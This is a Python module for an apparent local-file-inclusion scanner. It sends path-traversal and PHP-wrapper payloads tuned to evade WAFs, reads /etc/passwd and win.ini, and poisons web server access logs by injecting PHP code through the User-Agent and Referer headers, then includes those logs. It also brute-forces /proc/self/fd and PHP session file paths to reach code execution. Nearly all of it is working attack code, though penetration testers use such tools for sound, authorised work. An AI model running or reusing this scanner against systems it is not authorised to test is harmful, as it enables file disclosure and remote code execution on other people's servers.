import re, os
from typing import Optional, Dict, List
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url
from tools.payload_engine import generate

logger = get_logger("lfi_scanner")

LFI_RCE_PAYLOAD = "echo 'LFI_TEST_SUCCESS';"

EVIDENCE_PATTERNS = [
    (r"root:.*:0:0:", "/etc/passwd"),
    (r"\[fonts\]", "/windows/win.ini"),
    (r"\[extensions\]", "/windows/win.ini"),
    (r"\[mail\]", "/windows/win.ini"),
    (r"root:", "/etc/passwd"),
    (r"www-data|xfs|nobody|daemon|bin:", "/etc/passwd"),
    (r"uid=\d+\([\w]+\)", "cmd_exec"),
    (r"gid=\d+\([\w]+\)", "cmd_exec"),
]

SESSION_POISON_PATHS = [
    "/tmp/sess_%s",
    "/var/lib/php/sessions/sess_%s",
    "/var/lib/php/session/sess_%s",
    "/var/cpanel/php/sessions/sess_%s",
    "/var/www/html/tmp/sess_%s",
    "/tmp/session/sess_%s",
    "/var/lib/php7.4/sessions/sess_%s",
    "/var/lib/php8.0/sessions/sess_%s",
    "/var/lib/php8.1/sessions/sess_%s",
    "/var/lib/php8.2/sessions/sess_%s",
]

PROC_FD_PATHS = ["/proc/self/fd/%d" % i for i in range(0, 50)]


class LFIScanner:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0,
                 waf_name: Optional[str] = None):
        self.sess = sess or requests.Session()
        self.timeout = timeout
        self.waf_name = waf_name
        self.findings = []

    def check_traversal(self, url: str, param: str) -> List[Dict]:
        results = []
        seeds = generate("lfi", "traversal", "all", self.waf_name) + \
                generate("lfi", "encoded", "all", self.waf_name)
        for entry in seeds:
            payload = entry["payload"]
            try:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout, verify=False)
                for pat, label in EVIDENCE_PATTERNS:
                    if re.search(pat, r.text):
                        results.append({"payload": payload[:30], "label": label,
                                        "size": len(r.text), "status": r.status_code})
                        break
            except Exception as e:
                logger.debug("lfi traversal %s: %s", payload[:20], e)
        return results

    def check_php_wrappers(self, url: str, param: str) -> List[Dict]:
        results = []
        seeds = generate("lfi", "php_wrappers", "all", self.waf_name)
        for entry in seeds:
            payload = entry["payload"]
            wrapper_type = entry.get("type", "")
            indicator = entry.get("indicator", "")
            try:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout, verify=False)
                if wrapper_type == "base64":
                    if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', r.text):
                        results.append({"payload": payload[:35], "type": "base64", "size": len(r.text)})
                elif wrapper_type == "rce":
                    if "uid=" in r.text or "LFI_TEST" in r.text or len(r.text) > 10:
                        results.append({"payload": payload[:35], "type": "rce_data", "size": len(r.text)})
                elif indicator and indicator in r.text:
                    results.append({"payload": payload[:35], "type": "disclosure", "size": len(r.text)})
            except Exception as e:
                logger.debug("lfi wrapper %s: %s", payload[:20], e)
        return results

    def check_log_poison(self, url: str, param: str) -> List[Dict]:
        results = []
        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/error.log",
            "/var/log/nginx/error.log",
        ]
        poison_payload = "<?php %s ?>" % LFI_RCE_PAYLOAD
        try:
            self.sess.get(build_url(url, param, poison_payload),
                          timeout=self.timeout, verify=False)
        except Exception as e:
            logger.debug("lfi poison injection: %s", e)

        headers_poison = {"User-Agent": poison_payload, "Referer": poison_payload}
        try:
            self.sess.get(url, headers=headers_poison, timeout=self.timeout, verify=False)
        except Exception as e:
            logger.debug("lfi header poison: %s", e)

        for log_path in log_paths:
            try:
                payload = "../../.." + log_path
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout, verify=False)
                if "LFI_TEST_SUCCESS" in r.text:
                    results.append({"type": "log_poison_rce", "path": log_path,
                                    "status": r.status_code})
                elif "uid=" in r.text or "root:" in r.text:
                    results.append({"type": "log_poison", "path": log_path,
                                    "status": r.status_code})
            except Exception as e:
                logger.debug("lfi log poison %s: %s", log_path, e)
        return results

    def check_proc_fd_bruteforce(self, url: str, param: str) -> List[Dict]:
        results = []
        for fd_path in PROC_FD_PATHS:
            try:
                r = self.sess.get(build_url(url, param, fd_path),
                                  timeout=self.timeout, verify=False)
                if len(r.text) > 50:
                    results.append({"fd": fd_path, "size": len(r.text),
                                    "status": r.status_code})
            except Exception as e:
                logger.debug("lfi fd %s: %s", fd_path, e)
        return results

    def check_session_poison(self, url: str, param: str, session_id: str = None) -> List[Dict]:
        results = []
        sid = session_id or "sess_" + os.urandom(8).hex()
        unique_paths = list(dict.fromkeys(SESSION_POISON_PATHS))
        for sess_path_tpl in unique_paths:
            try:
                payload = sess_path_tpl % sid
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout, verify=False)
                if len(r.text) > 20:
                    results.append({"session_path": payload, "size": len(r.text)})
            except Exception as e:
                logger.debug("lfi session poison %s: %s", sess_path_tpl, e)
        return results

    def check(self, url: str, param: str) -> Dict:
        result = {"vulnerable": False, "rce_available": False, "findings": []}
        result["findings"].extend(self.check_traversal(url, param))
        result["findings"].extend(self.check_php_wrappers(url, param))
        result["findings"].extend(self.check_log_poison(url, param))
        result["findings"].extend(self.check_proc_fd_bruteforce(url, param))
        result["findings"].extend(self.check_session_poison(url, param))
        if result["findings"]:
            result["vulnerable"] = True
        for f in result["findings"]:
            if "rce" in f.get("type", "") or f.get("label") == "cmd_exec":
                result["rce_available"] = True
                break
        return result

    def run(self, url: str, param: str) -> Dict:
        return self.check(url, param)


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, waf_name: Optional[str] = None) -> Dict:
    scanner = LFIScanner(sess, timeout, waf_name)
    return scanner.check(url, param)
